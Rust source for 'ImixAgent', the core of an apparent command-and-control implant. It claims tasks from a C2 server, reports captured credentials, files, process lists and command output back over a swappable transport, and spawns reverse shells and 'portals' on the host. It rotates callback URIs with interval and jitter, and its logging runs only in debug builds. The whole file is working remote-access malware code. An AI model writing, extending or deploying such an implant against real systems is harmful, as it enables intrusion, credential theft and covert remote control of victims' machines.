use anyhow::{Context as AnyhowContext, Result};
use eldritch::agent::agent::Agent;
use eldritch_agent::Context;
use pb::c2::host::Platform;
use pb::c2::transport::Type;
use pb::c2::{
    self, ClaimTasksRequest, ReportOutputRequest, ReportShellTaskOutputMessage,
    ReportTaskOutputMessage, ShellTaskContext, ShellTaskOutput, TaskContext, TaskOutput,
    report_output_request,
};
use pb::config::Config;
use std::collections::{BTreeMap, BTreeSet};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::RwLock;
use transport::Transport;

use crate::portal::run_create_portal;
use crate::shell::manager::{ShellManager, ShellManagerMessage};
use crate::shell::{run_repl_reverse_shell, run_reverse_shell_pty};
use crate::task::TaskRegistry;

const MAX_BUF_OUTPUT_MESSAGES: usize = 65535;

#[derive(Clone)]
pub struct ImixAgent {
    config: Arc<RwLock<Config>>,
    transport: Arc<RwLock<Box<dyn Transport + Send + Sync>>>,
    runtime_handle: tokio::runtime::Handle,
    pub task_registry: Arc<TaskRegistry>,
    pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
    pub output_tx: std::sync::mpsc::SyncSender<c2::ReportOutputRequest>,
    pub output_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportOutputRequest>>>,
    pub process_list_tx: std::sync::mpsc::SyncSender<c2::ReportProcessListRequest>,
    pub process_list_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportProcessListRequest>>>,
    pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
}

impl ImixAgent {
    pub fn new(
        config: Config,
        runtime_handle: tokio::runtime::Handle,
        task_registry: Arc<TaskRegistry>,
        shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
    ) -> Self {
        let (output_tx, output_rx) = std::sync::mpsc::sync_channel(MAX_BUF_OUTPUT_MESSAGES);
        let (process_list_tx, process_list_rx) = std::sync::mpsc::sync_channel(64);

        Self {
            config: Arc::new(RwLock::new(config)),
            transport: Arc::new(RwLock::new(transport::init_transport())),
            runtime_handle,
            task_registry,
            subtasks: Arc::new(Mutex::new(BTreeMap::new())),
            output_tx,
            output_rx: Arc::new(Mutex::new(output_rx)),
            process_list_tx,
            process_list_rx: Arc::new(Mutex::new(process_list_rx)),
            shell_manager_tx,
        }
    }

    pub fn start_shell_manager(self: Arc<Self>, manager: ShellManager) {
        self.runtime_handle.spawn(manager.run());
    }

    pub fn get_callback_interval_u64(&self) -> Result<u64> {
        // Blocks on read, but it's fast
        let cfg = self
            .config
            .try_read()
            .map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
        let info = cfg
            .info
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;

        let available_transports = info
            .available_transports
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("no available transports set"))?;

        let active_idx = available_transports.active_index as usize;
        let interval = available_transports
            .transports
            .get(active_idx)
            .or_else(|| available_transports.transports.first())
            .ok_or_else(|| anyhow::anyhow!("no transports configured"))?
            .interval;

        Ok(interval)
    }

    pub fn get_callback_jitter(&self) -> Result<f32> {
        // Blocks on read, but it's fast
        let cfg = self
            .config
            .try_read()
            .map_err(|_| anyhow::anyhow!("Failed to acquire read lock on config"))?;
        let info = cfg
            .info
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("No beacon info in config"))?;

        let available_transports = info
            .available_transports
            .as_ref()
            .ok_or_else(|| anyhow::anyhow!("no available transports set"))?;

        let active_idx = available_transports.active_index as usize;
        let jitter = available_transports
            .transports
            .get(active_idx)
            .or_else(|| available_transports.transports.first())
            .ok_or_else(|| anyhow::anyhow!("no transports configured"))?
            .jitter;

        Ok(jitter)
    }

    // Triggers config.refresh_primary_ip() in a write lock
    pub async fn refresh_ip(&self) {
        let mut cfg = self.config.write().await;
        cfg.refresh_primary_ip();
    }

    // Updates the shared transport with a new instance
    pub async fn update_transport(&self, t: Box<dyn Transport + Send + Sync>) {
        let mut transport = self.transport.write().await;
        *transport = t;
    }

    // Flushes all buffered task outputs and process list reports using the provided transport
    pub async fn flush_outputs(&self) {
        let mut outputs = Vec::new();
        if let Ok(rx) = self.output_rx.lock() {
            while let Ok(msg) = rx.recv_timeout(Duration::from_millis(10)) {
                outputs.push(msg);
            }
        }

        let mut process_list_reqs = Vec::new();
        if let Ok(rx) = self.process_list_rx.lock() {
            while let Ok(msg) = rx.recv_timeout(Duration::from_millis(10)) {
                process_list_reqs.push(msg);
            }
        }

        #[cfg(debug_assertions)]
        log::info!(
            "Flushing {} task outputs and {} process list reports",
            outputs.len(),
            process_list_reqs.len()
        );

        if outputs.is_empty() && process_list_reqs.is_empty() {
            return;
        }

        let mut merged_task_outputs: BTreeMap<i64, (TaskContext, TaskOutput)> = BTreeMap::new();
        let mut merged_shell_outputs: BTreeMap<i64, (ShellTaskContext, ShellTaskOutput)> =
            BTreeMap::new();

        for output in outputs {
            if let Some(msg) = output.message {
                match msg {
                    report_output_request::Message::TaskOutput(m) => {
                        if let (Some(ctx), Some(new_out)) = (m.context, m.output) {
                            let task_id = ctx.task_id;
                            use std::collections::btree_map::Entry;
                            match merged_task_outputs.entry(task_id) {
                                Entry::Occupied(mut entry) => {
                                    let (_, existing_out) = entry.get_mut();
                                    existing_out.output.push_str(&new_out.output);
                                    match (&mut existing_out.error, &new_out.error) {
                                        (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
                                        (None, Some(e2)) => existing_out.error = Some(e2.clone()),
                                        _ => {}
                                    }
                                    if new_out.exec_finished_at.is_some() {
                                        existing_out.exec_finished_at =
                                            new_out.exec_finished_at.clone();
                                    }
                                }
                                Entry::Vacant(entry) => {
                                    entry.insert((ctx, new_out));
                                }
                            }
                        }
                    }
                    report_output_request::Message::ShellTaskOutput(m) => {
                        if let (Some(ctx), Some(new_shell_out)) = (m.context, m.output) {
                            let shell_task_id = ctx.shell_task_id;
                            use std::collections::btree_map::Entry;
                            match merged_shell_outputs.entry(shell_task_id) {
                                Entry::Occupied(mut entry) => {
                                    let (_, existing_out) = entry.get_mut();
                                    existing_out.output.push_str(&new_shell_out.output);
                                    match (&mut existing_out.error, &new_shell_out.error) {
                                        (Some(e1), Some(e2)) => e1.msg.push_str(&e2.msg),
                                        (None, Some(e2)) => existing_out.error = Some(e2.clone()),
                                        _ => {}
                                    }
                                    if new_shell_out.exec_finished_at.is_some() {
                                        existing_out.exec_finished_at =
                                            new_shell_out.exec_finished_at.clone();
                                    }
                                }
                                Entry::Vacant(entry) => {
                                    entry.insert((ctx, new_shell_out));
                                }
                            }
                        }
                    }
                }
            }
        }

        let mut transport_guard = self.transport.write().await;
        let transport = &mut *transport_guard;
        if !transport.is_active() {
            return;
        }

        for (_, (ctx, output)) in merged_task_outputs {
            #[cfg(debug_assertions)]
            log::info!("Task Output: {output:#?}");

            let req = ReportOutputRequest {
                message: Some(report_output_request::Message::TaskOutput(
                    ReportTaskOutputMessage {
                        context: Some(ctx),
                        output: Some(output),
                    },
                )),
            };

            if let Err(_e) = transport.report_output(req).await {
                #[cfg(debug_assertions)]
                log::error!("Failed to report task output: {_e}");
            }
        }

        for (_, (ctx, output)) in merged_shell_outputs {
            #[cfg(debug_assertions)]
            log::info!("Shell Task Output: {output:#?}");

            let req = ReportOutputRequest {
                message: Some(report_output_request::Message::ShellTaskOutput(
                    ReportShellTaskOutputMessage {
                        context: Some(ctx),
                        output: Some(output),
                    },
                )),
            };

            if let Err(_e) = transport.report_output(req).await {
                #[cfg(debug_assertions)]
                log::error!("Failed to report shell task output: {_e}");
            }
        }

        // Only send the latest process list report (it replaces previous ones)
        if let Some(req) = process_list_reqs.into_iter().last() {
            if let Err(_e) = transport.report_process_list(req).await {
                #[cfg(debug_assertions)]
                log::error!("Failed to report process list: {_e}");
            }
        }
    }

    // Helper to get config URIs for creating new transport
    pub async fn get_transport_config(&self) -> Config {
        let config = self.config.read().await.clone();
        config
    }

    pub async fn rotate_callback_uri(&self) {
        let mut cfg = self.config.write().await;
        if let Some(info) = cfg.info.as_mut()
            && let Some(available_transports) = info.available_transports.as_mut()
        {
            let num_transports = available_transports.transports.len();
            if num_transports > 0 {
                let current_idx = available_transports.active_index as usize;
                available_transports.active_index = ((current_idx + 1) % num_transports) as u32;
            }
        }
    }

    // Helper to get a usable transport.
    // If the shared transport is active, returns a clone of it.
    // If not, creates a new one from config.
    async fn get_usable_transport(&self) -> Result<Box<dyn Transport + Send + Sync>> {
        // 1. Check shared transport
        {
            let guard = self.transport.read().await;
            if guard.is_active() {
                return Ok(guard.clone_box());
            }
        }
        // 2. Create new transport from config
        let config = self.get_transport_config().await;
        let t =
            transport::create_transport(config).context("Failed to create on-demand transport")?;

        #[cfg(debug_assertions)]
        log::debug!("Created on-demand transport for background task");

        Ok(t)
    }

    // Helper to claim tasks and return them, so main can spawn
    pub async fn claim_tasks(&self) -> Result<c2::ClaimTasksResponse> {
        let mut transport_guard = self.transport.write().await;
        let transport = &mut *transport_guard;
        let beacon_info = self.config.read().await.info.clone();
        let req = ClaimTasksRequest {
            beacon: beacon_info,
        };
        let response = transport
            .claim_tasks(req)
            .await
            .context("Failed to claim tasks")?;
        Ok(response)
    }

    pub async fn process_job_request(&self) -> Result<()> {
        let resp = self.claim_tasks().await?;

        let mut has_work = false;

        if !resp.tasks.is_empty() {
            has_work = true;
            let registry = self.task_registry.clone();
            let agent = Arc::new(self.clone());
            for task in resp.tasks {
                #[cfg(debug_assertions)]
                log::info!("Claimed task {}: JWT={}", task.id, task.jwt);

                registry.spawn(task, agent.clone());
            }
        }

        if !resp.shell_tasks.is_empty() {
            has_work = true;
            for shell_task in resp.shell_tasks {
                let _ = self
                    .shell_manager_tx
                    .try_send(ShellManagerMessage::ProcessTask(shell_task));
            }
        }

        if !has_work {
            return Ok(());
        }

        Ok(())
    }

    // Helper to run a future on the runtime handle, blocking the current thread.
    fn block_on<F, R>(&self, future: F) -> Result<R, String>
    where
        F: std::future::Future<Output = Result<R, String>>,
    {
        self.runtime_handle.block_on(future)
    }

    // Helper to execute an async action with a usable transport, handling setup and errors.
    fn with_transport<F, Fut, R>(&self, action: F) -> Result<R, String>
    where
        F: FnOnce(Box<dyn Transport + Send + Sync>) -> Fut,
        Fut: std::future::Future<Output = Result<R, anyhow::Error>>,
    {
        self.block_on(async {
            let t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            action(t).await.map_err(|e| e.to_string())
        })
    }

    // Helper to spawn a background subtask (like a reverse shell)
    fn spawn_subtask<F, Fut>(&self, task_id: i64, action: F) -> Result<(), String>
    where
        F: FnOnce(Box<dyn Transport + Send + Sync>) -> Fut + Send + 'static,
        Fut: std::future::Future<Output = Result<()>> + Send + 'static,
    {
        let subtasks = self.subtasks.clone();
        let agent = self.clone();

        let handle = self.runtime_handle.spawn(async move {
            // We need a transport for the subtask. Get it asynchronously.
            match agent.get_usable_transport().await {
                Ok(transport) => {
                    if let Err(_e) = action(transport).await {
                        #[cfg(debug_assertions)]
                        log::error!("Subtask {} error: {_e:#}", task_id);
                    }
                }
                Err(_e) => {
                    #[cfg(debug_assertions)]
                    log::error!("Subtask {} failed to get transport: {_e:#}", task_id);
                }
            }
        });

        if let Ok(mut map) = subtasks.lock() {
            map.insert(task_id, handle);
        }

        Ok(())
    }
}

// Implement the Eldritch Agent Trait
impl Agent for ImixAgent {
    fn fetch_asset(&self, req: c2::FetchAssetRequest) -> Result<Vec<u8>, String> {
        self.with_transport(|mut t| async move {
            // Transport uses std::sync::mpsc::Sender for fetch_asset
            let (tx, rx) = std::sync::mpsc::channel();
            t.fetch_asset(req, tx).await?;

            let mut data = Vec::new();
            while let Ok(resp) = rx.recv() {
                data.extend(resp.chunk);
            }
            Ok(data)
        })
    }

    fn report_credential(
        &self,
        req: c2::ReportCredentialRequest,
    ) -> Result<c2::ReportCredentialResponse, String> {
        self.with_transport(|mut t| async move { t.report_credential(req).await })
    }

    fn report_file(
        &self,
        req: std::sync::mpsc::Receiver<c2::ReportFileRequest>,
    ) -> Result<c2::ReportFileResponse, String> {
        self.with_transport(|mut t| async move { t.report_file(req).await })
    }

    fn report_process_list(
        &self,
        req: c2::ReportProcessListRequest,
    ) -> Result<c2::ReportProcessListResponse, String> {
        // Buffer the request to be sent during the next flush cycle
        self.process_list_tx
            .try_send(req)
            .map_err(|_| "Process list buffer full".to_string())?;
        Ok(c2::ReportProcessListResponse {})
    }

    fn report_output(
        &self,
        req: c2::ReportOutputRequest,
    ) -> Result<c2::ReportOutputResponse, String> {
        // Buffer output instead of sending immediately
        self.output_tx
            .try_send(req)
            .map_err(|_| "Output buffer full".to_string())?;
        Ok(c2::ReportOutputResponse {})
    }

    fn start_reverse_shell(&self, context: Context, cmd: Option<String>) -> Result<(), String> {
        let id = match &context {
            Context::Task(tc) => tc.task_id,
            Context::ShellTask(stc) => stc.shell_task_id,
        };
        self.spawn_subtask(id, move |transport| async move {
            run_reverse_shell_pty(context, cmd, transport).await
        })
    }

    fn create_portal(&self, context: Context) -> Result<(), String> {
        let shell_manager_tx = self.shell_manager_tx.clone();
        let id = match &context {
            Context::Task(tc) => tc.task_id,
            Context::ShellTask(stc) => stc.shell_task_id,
        };
        self.spawn_subtask(id, move |transport| async move {
            run_create_portal(context, transport, shell_manager_tx).await
        })
    }

    fn start_repl_reverse_shell(&self, context: Context) -> Result<(), String> {
        let agent = self.clone();
        let id = match &context {
            Context::Task(tc) => tc.task_id,
            Context::ShellTask(stc) => stc.shell_task_id,
        };
        self.spawn_subtask(id, move |transport| async move {
            run_repl_reverse_shell(context, transport, agent).await
        })
    }

    fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
        self.with_transport(|mut t| async move { t.claim_tasks(req).await })
    }

    fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
        let mut map = BTreeMap::new();
        // Blocks on read, but it's fast
        let cfg = self
            .block_on(async { Ok(self.config.read().await.clone()) })
            .map_err(|e: String| e)?;

        let active_uri = self.get_active_callback_uri().unwrap_or_default();
        let config = cfg.clone();

        let available_transports = config
            .info
            .as_ref()
            .and_then(|info| info.available_transports.as_ref())
            .context("failed to get available transports")
            .map_err(|e| e.to_string())?;

        let active_idx = available_transports.active_index as usize;
        let active_transport = available_transports
            .transports
            .get(active_idx)
            .or_else(|| available_transports.transports.first())
            .context("no transports configured")
            .map_err(|e| e.to_string())?;

        map.insert("callback_uri".to_string(), active_uri);
        map.insert(
            "retry_interval".to_string(),
            active_transport.interval.to_string(),
        );
        map.insert("run_once".to_string(), cfg.run_once.to_string());

        if let Some(info) = &cfg.info {
            map.insert("beacon_id".to_string(), info.identifier.clone());
            map.insert("principal".to_string(), info.principal.clone());
            map.insert(
                "interval".to_string(),
                active_transport.interval.to_string(),
            );
            if let Some(host) = &info.host {
                map.insert("hostname".to_string(), host.name.clone());
                map.insert(
                    "platform".to_string(),
                    Platform::try_from(host.platform)
                        .unwrap_or_default()
                        .as_str_name()
                        .into(),
                );
                map.insert("primary_ip".to_string(), host.primary_ip.clone());
            }
            if let Some(available_transports) = &info.available_transports {
                let idx = available_transports.active_index;
                let active_transport = &available_transports.transports[idx as usize];
                map.insert("uri".to_string(), active_transport.uri.clone());
                map.insert(
                    "type".to_string(),
                    Type::try_from(active_transport.r#type)
                        .unwrap_or_default()
                        .as_str_name()
                        .into(),
                );
                map.insert(
                    "extra".to_string(),
                    active_transport.extra.clone().to_string(),
                );
            }
        }
        Ok(map)
    }

    fn get_transport(&self) -> Result<String, String> {
        // Blocks on read, but it's fast
        self.block_on(async {
            let t = self
                .get_usable_transport()
                .await
                .map_err(|e| e.to_string())?;
            Ok(t.name().to_string())
        })
    }

    // TODO: This should probably be removed as schema and transport should be directly tied to one another.
    fn set_transport(&self, transport: String) -> Result<(), String> {
        let available = self.list_transports()?;
        if !available.contains(&transport) {
            return Err(format!("Invalid transport: {}", transport));
        }

        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut()
                && let Some(available_transports) = info.available_transports.as_mut()
            {
                let active_idx = available_transports.active_index as usize;
                if let Some(current_transport) = available_transports.transports.get(active_idx) {
                    let current_uri = &current_transport.uri;
                    // Create new URI with the new transport scheme
                    // TODO: We probably don't need to decouple schema and uri
                    let new_uri = if let Some(pos) = current_uri.find("://") {
                        format!("{}://{}", transport, &current_uri[pos + 3..])
                    } else {
                        format!("{}://{}", transport, current_uri)
                    };

                    // Create a new transport with the new URI
                    let new_transport = pb::c2::Transport {
                        uri: new_uri,
                        interval: current_transport.interval,
                        r#type: current_transport.r#type,
                        extra: current_transport.extra.clone(),
                        jitter: current_transport.jitter,
                    };

                    // Append the new transport and update active_index
                    available_transports.transports.push(new_transport);
                    available_transports.active_index =
                        (available_transports.transports.len() - 1) as u32;
                }
            }
            Ok(())
        })
    }

    fn list_transports(&self) -> Result<Vec<String>, String> {
        self.block_on(async { Ok(self.transport.read().await.list_available()) })
    }

    fn get_callback_interval(&self) -> Result<u64, String> {
        self.get_callback_interval_u64().map_err(|e| e.to_string())
    }

    fn set_callback_interval(&self, interval: u64) -> Result<(), String> {
        self.block_on(async {
            {
                let mut cfg = self.config.write().await;
                if let Some(info) = &mut cfg.info
                    && let Some(available_transports) = &mut info.available_transports
                {
                    let active_idx = available_transports.active_index as usize;
                    if let Some(transport) = available_transports.transports.get_mut(active_idx) {
                        transport.interval = interval;
                    }
                }
            }
            // We force a check-in to update the server with the new interval
            let _ = self.process_job_request().await;
            Ok(())
        })
    }

    fn set_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            // Parse the new URI to handle DSN format with query parameters
            let parsed_transport = pb::config::parse_dsn(&uri)
                .map_err(|e| format!("Failed to parse callback URI: {}", e))?;

            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut()
                && let Some(available_transports) = info.available_transports.as_mut()
            {
                // Note: We compare against parsed_transport.uri because parse_dsn strips the query string
                if let Some(pos) = available_transports
                    .transports
                    .iter()
                    .position(|t| t.uri == parsed_transport.uri && t.r#type == parsed_transport.r#type)
                {
                    // Set active_index to existing transport
                    available_transports.active_index = pos as u32;

                    // We also want to update the settings if they were provided in the DSN
                    // Let's replace the existing transport with the newly parsed one
                    available_transports.transports[pos] = parsed_transport;
                } else {
                    available_transports.transports.push(parsed_transport);
                    available_transports.active_index =
                        (available_transports.transports.len() - 1) as u32;
                }
            }
            Ok(())
        })
    }

    fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            let uris: BTreeSet<String> = cfg
                .info
                .as_ref()
                .and_then(|info| info.available_transports.as_ref())
                .map(|at| at.transports.iter().map(|t| t.uri.clone()).collect())
                .unwrap_or_default();
            Ok(uris)
        })
    }

    fn get_active_callback_uri(&self) -> Result<String, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            cfg.info
                .as_ref()
                .and_then(|info| info.available_transports.as_ref())
                .and_then(|at| {
                    let active_idx = at.active_index as usize;
                    at.transports
                        .get(active_idx)
                        .or_else(|| at.transports.first())
                })
                .map(|t| t.uri.clone())
                .ok_or_else(|| "No callback URIs configured".to_string())
        })
    }

    fn get_next_callback_uri(&self) -> Result<String, String> {
        self.block_on(async {
            let cfg = self.config.read().await;
            cfg.info
                .as_ref()
                .and_then(|info| info.available_transports.as_ref())
                .and_then(|at| {
                    if at.transports.is_empty() {
                        return None;
                    }
                    let current_idx = at.active_index as usize;
                    let next_idx = (current_idx + 1) % at.transports.len();
                    at.transports.get(next_idx)
                })
                .map(|t| t.uri.clone())
                .ok_or_else(|| "No callback URIs configured".to_string())
        })
    }

    fn add_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut()
                && let Some(available_transports) = info.available_transports.as_mut()
            {
                // Check if URI already exists
                if !available_transports.transports.iter().any(|t| t.uri == uri) {
                    // Get current transport as template
                    let template = available_transports
                        .transports
                        .first()
                        .cloned()
                        .unwrap_or_else(|| pb::c2::Transport {
                            uri: uri.clone(),
                            interval: 5,
                            r#type: 0,
                            extra: String::new(),
                            jitter: 0.0,
                        });

                    let new_transport = pb::c2::Transport {
                        uri,
                        interval: template.interval,
                        r#type: template.r#type,
                        extra: template.extra,
                        jitter: template.jitter,
                    };
                    available_transports.transports.push(new_transport);
                }
            }
            Ok(())
        })
    }

    fn remove_callback_uri(&self, uri: String) -> Result<(), String> {
        self.block_on(async {
            let mut cfg = self.config.write().await;
            if let Some(info) = cfg.info.as_mut()
                && let Some(available_transports) = info.available_transports.as_mut()
                && let Some(pos) = available_transports
                    .transports
                    .iter()
                    .position(|t| t.uri == uri)
            {
                available_transports.transports.remove(pos);
                // Adjust active_index if needed
                let active_idx = available_transports.active_index as usize;
                if active_idx >= available_transports.transports.len()
                    && !available_transports.transports.is_empty()
                {
                    available_transports.active_index = 0;
                }
            }
            Ok(())
        })
    }

    fn list_tasks(&self) -> Result<Vec<c2::Task>, String> {
        Ok(self.task_registry.list())
    }

    fn stop_task(&self, task_id: i64) -> Result<(), String> {
        self.task_registry.stop(task_id);
        // Also stop subtask
        let mut map = self
            .subtasks
            .lock()
            .map_err(|_| "Poisoned lock".to_string())?;
        if let Some(handle) = map.remove(&task_id) {
            handle.abort();
            #[cfg(debug_assertions)]
            log::info!("Aborted subtask {task_id}");
        }
        Ok(())
    }
}
